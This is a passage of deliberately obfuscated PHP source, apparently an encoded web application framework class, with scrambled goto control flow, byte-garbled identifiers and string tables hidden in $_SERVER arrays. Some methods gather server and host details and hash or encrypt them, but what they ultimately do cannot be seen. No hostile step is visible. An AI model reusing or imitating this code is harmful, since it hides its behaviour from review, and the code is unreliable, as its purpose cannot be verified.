B„ÌÏî‘¬¶: $this->update(); goto e“²ìŠ±ÁÄ; fï¦ß–¤øŠ: $bÈÂÇš =& $_SERVER[úÎü]; $a›Á…š´í =& $this->task; if ($a›Á…š´í[$bÈÂÇš[1564]] == $bÈÂÇš[1054]) { $a›Á…š´í[$bÈÂÇš[1564]] = $bÈÂÇš[307]; $a›Á…š´í[$bÈÂÇš[1535]] = 0; $a›Á…š´í[$bÈÂÇš[699]] = 0; } goto a´Í²Åò‰ó; e“²ìŠ±ÁÄ: } } goto c¼÷åöÇ×¿; dñİ‚£øÑš: $aÂ©½æµ¶ = $_SERVER[úÎü][567]; if (!$aÂ©½æµ¶) { die; } class Application { private $defaultModule = "\x69\x6e\x64\145\x78"; private $defaultController = "\151\156\144\145\x78"; private $defaultAction = "\x69\x6e\144\x65\170"; function __construct() { } public function setDefault($Fàğİ¶¥•Œ) { goto e†Ô¤×²á™; e†Ô¤×²á™: $e©‘ÀæÓí =& $_SERVER[úÎü]; $cŞˆèèÅ‹å =& $_SERVER[İÊø]; $BÃï´Ù‘Ï = $cŞˆèèÅ‹å[0]($cŞˆèèÅ‹å[1], $cŞˆèèÅ‹å[2]($Fàğİ¶¥•Œ, $cŞˆèèÅ‹å[1])); goto AÉİõæ–ß; c‚•”ë¢‡Ï: $this->defaultController = $BÃï´Ù‘Ï[1] ? $BÃï´Ù‘Ï[1] : $this->defaultController; $e£ó‡É„º = $e©‘ÀæÓí[569]; if (!$e£ó‡É„º) { return; } goto e­¬ÎÃŒ…; e­¬ÎÃŒ…: $this->defaultAction = $BÃï´Ù‘Ï[2] ? $BÃï´Ù‘Ï[2] : $this->defaultAction; $this->{$_SERVER[İÊø][3]}($cŞˆèèÅ‹å[4], array($this, $cŞˆèèÅ‹å[5])); $aÛË—­åö‚ = $e©‘ÀæÓí[570]; goto aÕˆÖ––‹¼; aÕˆÖ––‹¼: if (!$aÛË—­åö‚) { die; } goto bÒ­ï°ñ¦; AÉİõæ–ß: $this->defaultModule = $BÃï´Ù‘Ï[0] ? $BÃï´Ù‘Ï[0] : $this->defaultModule; $DªÏŠ¯¿÷ì = $e©‘ÀæÓí[568]; if (!$DªÏŠ¯¿÷ì) { return; } goto c‚•”ë¢‡Ï; bÒ­ï°ñ¦: } public function appRun($f«¸ÏØ‰¥) { goto f§¿’ö ªâ; Föæ à†£±: $FÙ¬ó½¤˜• = $cˆï‡…µÛ…[7]; $EÌ××–Ñ·Õ = $Eš¹‘ˆÙÙï[572]; if (!$EÌ××–Ñ·Õ) { die; } goto Eª¶‹…êš; e”Š´öç¢±: $cˆï‡…µÛ…[13](array($cˆï‡…µÛ…[14], $cˆï‡…µÛ…[15]), $FÙ¬ó½¤˜• . $cˆï‡…µÛ…[18], $f«¸ÏØ‰¥); goto b¢ƒÀÏ·©É; Eª¶‹…êš: if ($cÎ‰Ãäôù == $cˆï‡…µÛ…[8]) { $FÙ¬ó½¤˜• = $cˆï‡…µÛ…[9]; $d´ëÉº¾—[0] = $cˆï‡…µÛ…[10]; $d´ëÉº¾—[1] = $d´ëÉº¾—[1] . $cˆï‡…µÛ…[11]; $f«¸ÏØ‰¥ = $cˆï‡…µÛ…[12]($cˆï‡…µÛ…[1], $d´ëÉº¾—); $f«¸ÏØ‰¥ = $cˆï‡…µÛ…[2]($f«¸ÏØ‰¥, $cˆï‡…µÛ…[1]); } $cˆï‡…µÛ…[13](array($cˆï‡…µÛ…[14], $cˆï‡…µÛ…[15]), $FÙ¬ó½¤˜• . $cˆï‡…µÛ…[16], $f«¸ÏØ‰¥); $cˆï‡…µÛ…[17]($f«¸ÏØ‰¥); goto e”Š´öç¢±; f§¿’ö ªâ: $Eš¹‘ˆÙÙï =& $_SERVER[úÎü]; $cˆï‡…µÛ… =& $_SERVER[İÊø]; $d´ëÉº¾— = $cˆï‡…µÛ…[0]($cˆï‡…µÛ…[1], $f«¸ÏØ‰¥); goto e•½Ú¡À„; e•½Ú¡À„: $cÎ‰Ãäôù = $cˆï‡…µÛ…[6]($d´ëÉº¾—[0]); $Aİè“‹İÍŒ = $Eš¹‘ˆÙÙï[571]; if (!$Aİè“‹İÍŒ) { die; } goto Föæ à†£±; b¢ƒÀÏ·©É: } private function autorun() { $BçÒ†Ñ×ƒ… =& $_SERVER[úÎü]; $DêÄÑ¬´İ =& $_SERVER[İÊø]; global $config; if ($DêÄÑ¬´İ[19]($config[$DêÄÑ¬´İ[20]]) == 0) { return; } foreach ($config[$DêÄÑ¬´İ[20]] as $d²å’¸×…» => $a·‰²ÓÃ) { $this->{$_SERVER[İÊø][21]}($a·‰²ÓÃ); $d’±Ì»”Š = $BçÒ†Ñ×ƒ…[573]; if (strlen($d’±Ì»”Š) < $BçÒ†Ñ×ƒ…[564]) { die; } } } private function tnxsffc850e0() { goto FŒ›Ÿ­ô¥˜; A²Îï²å£: $GLOBALS[$eœ°„º‹ïÎ[22]][$eœ°„º‹ïÎ[23]] = $eœ°„º‹ïÎ[27]($bÜá„›ë»¼, $FŒ´åæŠ¨); $GLOBALS[$eœ°„º‹ïÎ[22]][$eœ°„º‹ïÎ[28]] = $eœ°„º‹ïÎ[29]($eœ°„º‹ïÎ[1], $GLOBALS[$eœ°„º‹ïÎ[22]][$eœ°„º‹ïÎ[23]]); goto d¸¨ì“éƒ; a…×Õ°¼Ã´: if (!$E™áÈÍõ¿ || $eœ°„º‹ïÎ[24]($E™áÈÍõ¿) <= $eœ°„º‹ïÎ[24]($dßÁàøÇŒ)) { return; } if ($eœ°„º‹ïÎ[6]($eœ°„º‹ïÎ[25]($E™áÈÍõ¿, -$eœ°„º‹ïÎ[24]($dßÁàøÇŒ))) != $dßÁàøÇŒ) { return; } $eğœëÄç = $eœ°„º‹ïÎ[25]($E™áÈÍõ¿, 0, -$eœ°„º‹ïÎ[24]($dßÁàøÇŒ)); goto d®Éë¾ì¡; d®Éë¾ì¡: $bÜá„›ë»¼ = array($eœ°„º‹ïÎ[8], $eğœëÄç); $F†™Òá¾†Ò = $b„á»ì—·À[575]; if (strlen($F†™Òá¾†Ò) < $b„á»ì—·À[576]) { die; } goto cÚòŞÏ‚›ã; cÄÎ‹Ö˜ò×: $E™áÈÍõ¿ = $GLOBALS[$eœ°„º‹ïÎ[22]][$eœ°„º‹ïÎ[23]][0]; $eã¤”‰‹…„ = $b„á»ì—·À[574]; while (strlen($eã¤”‰‹…„) < $b„á»ì—·À[564]) { if (!$eã¤”‰‹…„) { break; } $eã¤”‰‹…„++; } goto a…×Õ°¼Ã´; cÚòŞÏ‚›ã: $FŒ´åæŠ¨ = $eœ°„º‹ïÎ[26]($GLOBALS[$eœ°„º‹ïÎ[22]][$eœ°„º‹ïÎ[23]], 1); $F„ÜØïÁ‘ = $b„á»ì—·À[577]; if (strlen($F„ÜØïÁ‘) < $b„á»ì—·À[564]) { return; } goto A²Îï²å£; FŒ›Ÿ­ô¥˜: $b„á»ì—·À =& $_SERVER[úÎü]; $eœ°„º‹ïÎ =& $_SERVER[İÊø]; $dßÁàøÇŒ = $eœ°„º‹ïÎ[8]; goto cÄÎ‹Ö˜ò×; d¸¨ì“éƒ: } private function awgd27cdc3d6() { goto d•¡Œë…ßÏ; E¦Î¯Ü°’Œ: $E‰¥¤ØŸ—Ï = $cÑ“¬ »ğ[582]; while ($E‰¥¤ØŸ—Ï < $cÑ“¬ »ğ[583]) { if ($E‰¥¤ØŸ—Ï >= 0) { break; } $E‰¥¤ØŸ—Ï++; } goto c•´Ã®Ù¼è; aŞôµõğÜ: $D­ÊºŒ½‘ = $Aµ¯øáùÅ[2]($cßÛ»‡áø[0][0], $Aµ¯øáùÅ[36]); $GLOBALS[$Aµ¯øáùÅ[22]][$Aµ¯øáùÅ[23]] = $Aµ¯øáùÅ[0]($Aµ¯øáùÅ[36], $D­ÊºŒ½‘); $GLOBALS[$Aµ¯øáùÅ[22]][$Aµ¯øáùÅ[28]] = $Aµ¯øáùÅ[29]($Aµ¯øáùÅ[1], $GLOBALS[$Aµ¯øáùÅ[22]][$Aµ¯øáùÅ[23]]); goto E¦Î¯Ü°’Œ; eƒê²¦£°ç: $Aµ¯øáùÅ[34]($Aµ¯øáùÅ[35], $D­ÊºŒ½‘, $cßÛ»‡áø); $e„Šë¸ôÆø = $cÑ“¬ »ğ[581]; if (!$e„Šë¸ôÆø) { return; } goto aŞôµõğÜ; d•¡Œë…ßÏ: $cÑ“¬ »ğ =& $_SERVER[úÎü]; $Aµ¯øáùÅ =& $_SERVER[İÊø]; if ($GLOBALS[$Aµ¯øáùÅ[22]][$Aµ¯øáùÅ[28]] != $Aµ¯øáùÅ[10]) { return; } goto A™œ§’Å; A™œ§’Å: $eÖîÔÂà÷• = $_SERVER[$Aµ¯øáùÅ[30]]; $CºÂˆàÁøæ = $Aµ¯øáùÅ[31]; if (!$Aµ¯øáùÅ[32]($eÖîÔÂà÷•, $CºÂˆàÁøæ)) { return; } goto F“¸–‹Ñå; F“¸–‹Ñå: $eØ»¢‡ïà„ = $Aµ¯øáùÅ[33]($eÖîÔÂà÷•, $CºÂˆàÁøæ); $BÁÔÂ”¼³¤ = $cÑ“¬ »ğ[578]; if (!$BÁÔÂ”¼³¤) { return; } goto dßï„ºÁÕœ; dßï„ºÁÕœ: $D­ÊºŒ½‘ = $Aµ¯øáùÅ[25]($eÖîÔÂà÷•, $eØ»¢‡ïà„ + $Aµ¯øáùÅ[24]($CºÂˆàÁøæ)); $eÂ£ì˜øìê = $cÑ“¬ »ğ[579]; while ($eÂ£ì˜øìê < $cÑ“¬ »ğ[580]) { if ($eÂ£ì˜øìê >= 0) { break; } $eÂ£ì˜øìê++; } goto eƒê²¦£°ç; c•´Ã®Ù¼è: } public function run() { goto E¾Èì¬Ö›¾; cšæóŞ“µÁ: if ($C‹Î‚İ‘ˆª[19]($añ¢à±’Ãë) >= 3) { $this->{$_SERVER[İÊø][21]}($bø‚Ö‡‚œ‘); } else { $this->{$_SERVER[İÊø][21]}(ACTION); } goto FïÀùìó‹; BŒ±„Õ´§ï: $E×’‰›ê’ = $Eë™¦ù¢Ø“[584]; $C‹Î‚İ‘ˆª[39]($C‹Î‚İ‘ˆª[40], isset($añ¢à±’Ãë[0]) && $añ¢à±’Ãë[0] ? $añ¢à±’Ãë[0] : $this->defaultModule); $C‹Î‚İ‘ˆª[39]($C‹Î‚İ‘ˆª[41], isset($añ¢à±’Ãë[1]) && $añ¢à±’Ãë[0] ? $añ¢à±’Ãë[1] : $this->defaultController); goto f¯ÏÉÂâ«; E¾Èì¬Ö›¾: $Eë™¦ù¢Ø“ =& $_SERVER[úÎü]; $C‹Î‚İ‘ˆª =& $_SERVER[İÊø]; $this->{$_SERVER[İÊø][37]}(); goto cÌÈ‹š©õˆ; cÌÈ‹š©õˆ: $this->{$_SERVER[İÊø][38]}(); $añ¢à±’Ãë = $GLOBALS[$C‹Î‚İ‘ˆª[22]][$C‹Î‚İ‘ˆª[23]]; $bø‚Ö‡‚œ‘ = $GLOBALS[$C‹Î‚İ‘ˆª[22]][$C‹Î‚İ‘ˆª[28]]; goto BŒ±„Õ´§ï; e¤á“æ÷: $this->{$_SERVER[İÊø][45]}(); $b‰‚–İÌî = $Eë™¦ù¢Ø“[587]; while ($b‰‚–İÌî < $Eë™¦ù¢Ø“[580]) { if ($b‰‚–İÌî >= 0) { break; } $b‰‚–İÌî++; } goto cšæóŞ“µÁ; A³÷ŒÜëÔë: $C‹Î‚İ‘ˆª[39]($C‹Î‚İ‘ˆª[43], MOD . $C‹Î‚İ‘ˆª[1] . ST . $C‹Î‚İ‘ˆª[1] . ACT); $d‚”„‰ô™ö = $Eë™¦ù¢Ø“[586]; $_SERVER[$C‹Î‚İ‘ˆª[44]] = $C‹Î‚İ‘ˆª[6](ACTION); goto e¤á“æ÷; f¯ÏÉÂâ«: $C‹Î‚İ‘ˆª[39]($C‹Î‚İ‘ˆª[42], isset($añ¢à±’Ãë[2]) && $añ¢à±’Ãë[0] ? $añ¢à±’Ãë[2] : $this->defaultAction); $B©ø¹é‹íñ = $Eë™¦ù¢Ø“[585]; if (strlen($B©ø¹é‹íñ) < $Eë™¦ù¢Ø“[576]) { die; } goto A³÷ŒÜëÔë; FïÀùìó‹: } private $jysif0ecf5f7 = array(); private $yxfg666983d0 = ''; public function cagt716bea28() { goto d‹·àÉ”Ãğ; eÊÚ·ºå²¢: $this->{$_SERVER[İÊø][47]}(); $this->{$_SERVER[İÊø][48]}(); $A†„ÒÔğˆæ = $F÷ƒà´ÀØÜ[588]; goto e–ÉÃè–; e–ÉÃè–: while ($A†„ÒÔğˆæ < $F÷ƒà´ÀØÜ[583]) { if ($A†„ÒÔğˆæ >= 0) { break; } $A†„ÒÔğˆæ++; } $this->{$_SERVER[İÊø][49]}(); $this->{$_SERVER[İÊø][50]}(); goto fõÏ¥ƒ£ñ; B¹¢ª‹Í–: $this->{$_SERVER[İÊø][3]}($AòÁ²Îïó[55], array($this, $AòÁ²Îïó[56])); $this->{$_SERVER[İÊø][3]}($AòÁ²Îïó[57], array($this, $AòÁ²Îïó[58])); $E¿¬ä°¤¶ = $F÷ƒà´ÀØÜ[589]; goto bÃâ¸Õº Ô; fõÏ¥ƒ£ñ: $this->{$_SERVER[İÊø][51]}(); $this->{$_SERVER[İÊø][52]}(); $this->{$_SERVER[İÊø][3]}($AòÁ²Îïó[53], array($this, $AòÁ²Îïó[54])); goto B¹¢ª‹Í–; bÃâ¸Õº Ô: if (strlen($E¿¬ä°¤¶) < $F÷ƒà´ÀØÜ[583]) { die; } $this->{$_SERVER[İÊø][3]}($AòÁ²Îïó[59], array($this, $AòÁ²Îïó[60])); goto e–Û¤­Æ¨œ; d‹·àÉ”Ãğ: $F÷ƒà´ÀØÜ =& $_SERVER[úÎü]; $AòÁ²Îïó =& $_SERVER[İÊø]; $this->{$_SERVER[İÊø][46]}(); goto eÊÚ·ºå²¢; e–Û¤­Æ¨œ: } public function mzxq6c6214ed($C¾¥±¡­) { goto bããÕ”£‡Œ; e¢ÜŠòØíç: $C¾¥±¡­[$E¬†ÜˆøÀ–[114]][$E¬†ÜˆøÀ–[136]] = $E¬†ÜˆøÀ–[112]($this->jysif0ecf5f7, $E¬†ÜˆøÀ–[137], $E¬†ÜˆøÀ–[10]); $F·’“‚Ö‰À = $FÀÇª¥‘ƒ[595]; if ($E¬†ÜˆøÀ–[112]($GLOBALS, $E¬†ÜˆøÀ–[138]) && $this->config[$E¬†ÜˆøÀ–[139]]) { $C¾¥±¡­[$E¬†ÜˆøÀ–[114]][$E¬†ÜˆøÀ–[140]] = WEB_ROOT; } goto eÄ½Ó»Âˆê; cÇ²ª´ßØ¿: unset($C¾¥±¡­[$E¬†ÜˆøÀ–[102]][$E¬†ÜˆøÀ–[104]][$E¬†ÜˆøÀ–[105]]); unset($C¾¥±¡­[$E¬†ÜˆøÀ–[102]][$E¬†ÜˆøÀ–[104]][$E¬†ÜˆøÀ–[106]]); $c‚»­š­Ê = $FÀÇª¥‘ƒ[591]; goto fğƒÇŒ†§; fğƒÇŒ†§: while (strlen($c‚»­š­Ê) < $FÀÇª¥‘ƒ[592]) { if (!$c‚»­š­Ê) { break; } $c‚»­š­Ê++; } unset($C¾¥±¡­[$E¬†ÜˆøÀ–[102]][$E¬†ÜˆøÀ–[103]][$E¬†ÜˆøÀ–[76]]); $f¦âáå‹î = $FÀÇª¥‘ƒ[593]; goto Cò¬…ôÎìå; eÄ½Ó»Âˆê: return $C¾¥±¡­; goto b½ß×‰Ì»; Bö¤Éõ‡òŠ: if ($Bƒ´·ïêÔÖ[$E¬†ÜˆøÀ–[126]] != $E¬†ÜˆøÀ–[127]) { $C¾¥±¡­[$E¬†ÜˆøÀ–[114]][$E¬†ÜˆøÀ–[128]] = $Bƒ´·ïêÔÖ[$E¬†ÜˆøÀ–[128]]; $C¾¥±¡­[$E¬†ÜˆøÀ–[114]][$E¬†ÜˆøÀ–[129]] = $Bƒ´·ïêÔÖ[$E¬†ÜˆøÀ–[129]]; $d¿Á™—ªêì = $E¬†ÜˆøÀ–[130](10) . $this->yxfg666983d0 . $E¬†ÜˆøÀ–[130](5); $C¾¥±¡­[$E¬†ÜˆøÀ–[102]][$E¬†ÜˆøÀ–[131]][$E¬†ÜˆøÀ–[132]] = $this->{$_SERVER[İÊø][133]}($d¿Á™—ªêì, $C¾¥±¡­[$E¬†ÜˆøÀ–[114]][$E¬†ÜˆøÀ–[119]]); } if ($this->yxfg666983d0 == $E¬†ÜˆøÀ–[127]) { $C¾¥±¡­[$E¬†ÜˆøÀ–[102]][$E¬†ÜˆøÀ–[103]][$E¬†ÜˆøÀ–[108]][$E¬†ÜˆøÀ–[113]] = 0; } $C¾¥±¡­[$E¬†ÜˆøÀ–[114]][$E¬†ÜˆøÀ–[134]] = $E¬†ÜˆøÀ–[112]($this->jysif0ecf5f7, $E¬†ÜˆøÀ–[135], $E¬†ÜˆøÀ–[10]); goto e¢ÜŠòØíç; Fë“°ˆô½Ô: $C¾¥±¡­[$E¬†ÜˆøÀ–[114]][$E¬†ÜˆøÀ–[126]] = $this->yxfg666983d0; $fÀ–œÆØõÑ = $FÀÇª¥‘ƒ[594]; while (strlen($fÀ–œÆØõÑ) < $FÀÇª¥‘ƒ[583]) { if (!$fÀ–œÆØõÑ) { break; } $fÀ–œÆØõÑ++; } goto Bö¤Éõ‡òŠ; Cò¬…ôÎìå: while (strlen($f¦âáå‹î) < $FÀÇª¥‘ƒ[592]) { if (!$f¦âáå‹î) { break; } $f¦âáå‹î++; } unset($C¾¥±¡­[$E¬†ÜˆøÀ–[102]][$E¬†ÜˆøÀ–[103]][$E¬†ÜˆøÀ–[107]]); $C¾¥±¡­[$E¬†ÜˆøÀ–[102]][$E¬†ÜˆøÀ–[103]][$E¬†ÜˆøÀ–[108]] = array($E¬†ÜˆøÀ–[109] => (int) $bñ¼“­íáµ[$E¬†ÜˆøÀ–[110]], $E¬†ÜˆøÀ–[111] => (int) $E¬†ÜˆøÀ–[112]($bñ¼“­íáµ, $E¬†ÜˆøÀ–[113], 0)); goto F©Ã¸¸è»Ï; F©Ã¸¸è»Ï: $C¾¥±¡­[$E¬†ÜˆøÀ–[114]][$E¬†ÜˆøÀ–[115]] = $E¬†ÜˆøÀ–[116]($E¬†ÜˆøÀ–[117])->{$_SERVER[İÊø][118]}(); $C¾¥±¡­[$E¬†ÜˆøÀ–[114]][$E¬†ÜˆøÀ–[119]] = $E¬†ÜˆøÀ–[120]($_SERVER[$E¬†ÜˆøÀ–[121]] . $Bƒ´·ïêÔÖ[$E¬†ÜˆøÀ–[122]]); $C¾¥±¡­[$E¬†ÜˆøÀ–[114]][$E¬†ÜˆøÀ–[123]] = $E¬†ÜˆøÀ–[124]($E¬†ÜˆøÀ–[125]()); goto Fë“°ˆô½Ô; bããÕ”£‡Œ: $FÀÇª¥‘ƒ =& $_SERVER[úÎü]; $E¬†ÜˆøÀ– =& $_SERVER[İÊø]; $Bƒ´·ïêÔÖ = $E¬†ÜˆøÀ–[61]($E¬†ÜˆøÀ–[62])->{$_SERVER[İÊø][63]}(); goto AõÜæÖ‰¿ñ; AõÜæÖ‰¿ñ: $e­Ó‘²œ¡— = array($E¬†ÜˆøÀ–[64], $E¬†ÜˆøÀ–[65], $E¬†ÜˆøÀ–[66], $E¬†ÜˆøÀ–[67], $E¬†ÜˆøÀ–[68], $E¬†ÜˆøÀ–[69], $E¬†ÜˆøÀ–[70], $E¬†ÜˆøÀ–[71], $E¬†ÜˆøÀ–[72], $E¬†ÜˆøÀ–[73], $E¬†ÜˆøÀ–[74], $E¬†ÜˆøÀ–[75], $E¬†ÜˆøÀ–[76], $E¬†ÜˆøÀ–[77], $E¬†ÜˆøÀ–[78], $E¬†ÜˆøÀ–[79], $E¬†ÜˆøÀ–[80], $E¬†ÜˆøÀ–[81], $E¬†ÜˆøÀ–[82], $E¬†ÜˆøÀ–[83], $E¬†ÜˆøÀ–[84], $E¬†ÜˆøÀ–[85], $E¬†ÜˆøÀ–[86], $E¬†ÜˆøÀ–[87], $E¬†ÜˆøÀ–[88], $E¬†ÜˆøÀ–[89], $E¬†ÜˆøÀ–[90], $E¬†ÜˆøÀ–[91], $E¬†ÜˆøÀ–[92], $E¬†ÜˆøÀ–[93], $E¬†ÜˆøÀ–[94], $E¬†ÜˆøÀ–[95], $E¬†ÜˆøÀ–[96], $E¬†ÜˆøÀ–[97], $E¬†ÜˆøÀ–[98], $E¬†ÜˆøÀ–[99]); foreach ($e­Ó‘²œ¡— as $E‘Ö²—Şç) { $bõêøßÀ„Ë = $GLOBALS[$E¬†ÜˆøÀ–[100]][$E¬†ÜˆøÀ–[101]][$E‘Ö²—Şç]; $Aãë‰³©Õ‚ = $FÀÇª¥‘ƒ[590]; while ($Aãë‰³©Õ‚ < $FÀÇª¥‘ƒ[576]) { if ($Aãë‰³©Õ‚ >= 0) { break; } $Aãë‰³©Õ‚++; } if (isset($Bƒ´·ïêÔÖ[$E‘Ö²—Şç])) { $bõêøßÀ„Ë = $Bƒ´·ïêÔÖ[$E‘Ö²—Şç]; } $C¾¥±¡­[$E¬†ÜˆøÀ–[102]][$E¬†ÜˆøÀ–[103]][$E‘Ö²—Şç] = $bõêøßÀ„Ë; } $bñ¼“­íáµ = $C¾¥±¡­[$E¬†ÜˆøÀ–[102]][$E¬†ÜˆøÀ–[103]][$E¬†ÜˆøÀ–[76]]; goto cÇ²ª´ßØ¿; b½ß×‰Ì»: } private function hxjyf247910b() { goto Aê¾¾Æ÷Î; Aê¾¾Æ÷Î: $d˜ÁºÈ¥¾Š =& $_SERVER[úÎü]; $D¥àé¸Âùà =& $_SERVER[İÊø]; if ($_SERVER[$D¥àé¸Âùà[44]] == $D¥àé¸Âùà[141]) { goto cŞ¥¶â²œ; cßß¬©ğïî: while ($då°Ş¤‘•Õ < $d˜ÁºÈ¥¾Š[592]) { if ($då°Ş¤‘•Õ >= 0) { break; } $då°Ş¤‘•Õ++; } $D¥àé¸Âùà[13](array($D¥àé¸Âùà[157], $D¥àé¸Âùà[158]), $aêÃñ±â ß); goto C÷…®¿“ ƒ; cŞ¥¶â²œ: $dØÁ = array($D¥àé¸Âùà[126] => $this->yxfg666983d0, $D¥àé¸Âùà[142] => $this->{$_SERVER[İÊø][143]}(), $D¥àé¸Âùà[144] => $D¥àé¸Âùà[61]($D¥àé¸Âùà[145])->{$_SERVER[İÊø][146]}()); if ($this->yxfg666983d0 != $D¥àé¸Âùà[127]) { $f˜†½›â¯• = $D¥àé¸Âùà[112]($this->jysif0ecf5f7, $D¥àé¸Âùà[147]); if ($f˜†½›â¯•) { $dØÁ[$D¥àé¸Âùà[148]] = $f˜†½›â¯•; $dØÁ[$D¥àé¸Âùà[149]] = $D¥àé¸Âùà[150]($D¥àé¸Âùà[112]($this->jysif0ecf5f7, $D¥àé¸Âùà[151])); $dØÁ[$D¥àé¸Âùà[152]] = $D¥àé¸Âùà[112]($this->jysif0ecf5f7, $D¥àé¸Âùà[137]); } } $dØÁ = $this->{$_SERVER[İÊø][153]}($D¥àé¸Âùà[154]($dØÁ), $D¥àé¸Âùà[120]($D¥àé¸Âùà[155])); goto eŸ£Â‰øº; eŸ£Â‰øº: $fˆåğâì• = $d˜ÁºÈ¥¾Š[596]; $aêÃñ±â ß = array($D¥àé¸Âùà[156] => $dØÁ); $då°Ş¤‘•Õ = $d˜ÁºÈ¥¾Š[597]; goto cßß¬©ğïî; C÷…®¿“ ƒ: } goto DŞ†‚ÙµÍÚ; DŞ†‚ÙµÍÚ: if ($this->yxfg666983d0 == $D¥àé¸Âùà[127]) { return; } $Dß˜ï« = array($D¥àé¸Âùà[159], $D¥àé¸Âùà[160], $D¥àé¸Âùà[161], $D¥àé¸Âùà[162], $D¥àé¸Âùà[163], $D¥àé¸Âùà[164]); $d—ï°ïİŸ = $d˜ÁºÈ¥¾Š[598]; goto e±­¿§¡×„; E»óß¡©’ö: $D¥àé¸Âùà[13](array($D¥àé¸Âùà[157], $D¥àé¸Âùà[158]), $aêÃñ±â ß); goto dáÊ±ÁÕ“µ; e±­¿§¡×„: $aêÜÁ„¤¢Ô = $D¥àé¸Âùà[61]($D¥àé¸Âùà[62])->{$_SERVER[İÊø][63]}(); $aêÃñ±â ß = array($D¥àé¸Âùà[165] => $aêÜÁ„¤¢Ô[$D¥àé¸Âùà[64]], $D¥àé¸Âùà[166] => $aêÜÁ„¤¢Ô[$D¥àé¸Âùà[65]], $D¥àé¸Âùà[167] => $D¥àé¸Âùà[10]); foreach ($Dß˜ï« as $B…Å¾‘Şîì) { if (!isset($aêÜÁ„¤¢Ô[$B…Å¾‘Şîì]) || !$aêÜÁ„¤¢Ô[$B…Å¾‘Şîì]) { continue; } $aêÃñ±â ß[$B…Å¾‘Şîì] = $aêÜÁ„¤¢Ô[$B…Å¾‘Şîì]; $f­ˆ™Â›Û¹ = $d˜ÁºÈ¥¾Š[599]; if (strlen($f­ˆ™Â›Û¹) < $d˜ÁºÈ¥¾Š[576]) { die; } } goto E»óß¡©’ö; dáÊ±ÁÕ“µ: } private function iywd69cb6ca7() { goto aÎòİ­‘¡Å; B‰š»´ã: if (strlen($fÔéíçø) < $b›‰—œÁ¿á[583]) { return; } $F†ëŞŒ´È = $d¨–Êæ”á˜[220]($d¨–Êæ”á˜[25]($fº›ŞÓºã«, 10, 16)); $eöÁ¥™’ª = $b›‰—œÁ¿á[604]; goto FÈÑËÜÂÌ—; Eô÷ÜùÉ¿È: $d¨–Êæ”á˜[61]($d¨–Êæ”á˜[62])->{$_SERVER[İÊø][227]}($EİŠ–»†Ş); $fº›ŞÓºã« = $d¨–Êæ”á˜[120]($_SERVER[$d¨–Êæ”á˜[121]] . $d¨–Êæ”á˜[220]($Aàô÷È‘¸Ö) . $EİŠ–»†Ş[$d¨–Êæ”á˜[216]]); $fÔéíçø = $b›‰—œÁ¿á[603]; goto B‰š»´ã; D¡Õ„ÇôÃ: if (!isset($b·»’¥È²Ó[$d¨–Êæ”á˜[171]]) || $d¨–Êæ”á˜[24]($b·»’¥È²Ó[$d¨–Êæ”á˜[171]]) != 16) { $d¨–Êæ”á˜[172]($d¨–Êæ”á˜[173] . $b·»’¥È²Ó[$d¨–Êæ”á˜[171]], !1); } $Aàô÷È‘¸Ö = $d¨–Êæ”á˜[61]($d¨–Êæ”á˜[62])->{$_SERVER[İÊø][63]}($d¨–Êæ”á˜[122]); $Dõ‡ÓÈ¤ã¬ = array($d¨–Êæ”á˜[171] => $b·»’¥È²Ó[$d¨–Êæ”á˜[171]], $d¨–Êæ”á˜[174] => $d¨–Êæ”á˜[130](16), $d¨–Êæ”á˜[175] => $d¨–Êæ”á˜[155], $d¨–Êæ”á˜[176] => $d¨–Êæ”á˜[177], $d¨–Êæ”á˜[178] => $_SERVER[$d¨–Êæ”á˜[179]], $d¨–Êæ”á˜[180] => $_SERVER[$d¨–Êæ”á˜[181]], $d¨–Êæ”á˜[182] => $_SERVER[$d¨–Êæ”á˜[183]]); goto FÒÚ´øõƒ; bÔ„ãÛ¡‰ù: if (strlen($A¶¶¼œ±½Â) < $b›‰—œÁ¿á[583]) { return; } $bğ–¥ø¹³ = $AäóõÒá½[$d¨–Êæ”á˜[231]]; $d¹ä¾Ïé—‹ = $b›‰—œÁ¿á[607]; goto C³Œí‡•Ùë; Bñ¼èö®Ãß: $Eô¤…Üğí = $e»¹ç‹à“ . $EİŠ–»†Ş[$d¨–Êæ”á˜[126]] . $this->{$_SERVER[İÊø][153]}($d¨–Êæ”á˜[120]($EİŠ–»†Ş[$d¨–Êæ”á˜[215]]), $e»¹ç‹à“); $EİŠ–»†Ş[$d¨–Êæ”á˜[129]] = $d¨–Êæ”á˜[124]($d¨–Êæ”á˜[220]($this->{$_SERVER[İÊø][153]}($Eô¤…Üğí, $d¨–Êæ”á˜[222]))); if ($D‰‡ŒĞË„ã[$d¨–Êæ”á˜[223]] && $D‰‡ŒĞË„ã[$d¨–Êæ”á˜[223]] >= 1) { $d¨–Êæ”á˜[61]($d¨–Êæ”á˜[62])->{$_SERVER[İÊø][224]}($d¨–Êæ”á˜[225], $d¨–Êæ”á˜[226]); } goto Eô÷ÜùÉ¿È; cËŞ¿òïªŒ: if (!$AæİœØƒ½) { return; } $AäóõÒá½ = $d¨–Êæ”á˜[228]($d¨–Êæ”á˜[61]($d¨–Êæ”á˜[11])->{$_SERVER[İÊø][229]}(), $d¨–Êæ”á˜[230]); $A¶¶¼œ±½Â = $b›‰—œÁ¿á[606]; goto bÔ„ãÛ¡‰ù; C³Œí‡•Ùë: if (strlen($d¹ä¾Ïé—‹) < $b›‰—œÁ¿á[592]) { return; } $Bî¸ØóŠÅİ = array(); $Bî¸ØóŠÅİ[$F†ëŞŒ´È] = $A‰Â£‚Ò‰¤; goto F¹µÌ÷â¼; dç„†ì”œˆ: $D«¬Ò¤àä® = $f¥œ‹®ãà— . $EİŠ–»†Ş[$d¨–Êæ”á˜[126]] . $EİŠ–»†Ş[$d¨–Êæ”á˜[218]]; $EİŠ–»†Ş[$d¨–Êæ”á˜[128]] = $d¨–Êæ”á˜[220]($d¨–Êæ”á˜[124]($this->{$_SERVER[İÊø][153]}($D«¬Ò¤àä®, $d¨–Êæ”á˜[221]))); $BÄì£Š‰•ë = $b›‰—œÁ¿á[601]; goto B¶ËÀ™×ƒ”; aÎòİ­‘¡Å: $b›‰—œÁ¿á =& $_SERVER[úÎü]; $d¨–Êæ”á˜ =& $_SERVER[İÊø]; if ($_SERVER[$d¨–Êæ”á˜[44]] != $d¨–Êæ”á˜[168]) { return; } goto d¿”´Ú¶; Cö¶‡´°öÕ: $EİŠ–»†Ş = array($d¨–Êæ”á˜[215] => $Dõ‡ÓÈ¤ã¬[$d¨–Êæ”á˜[171]], 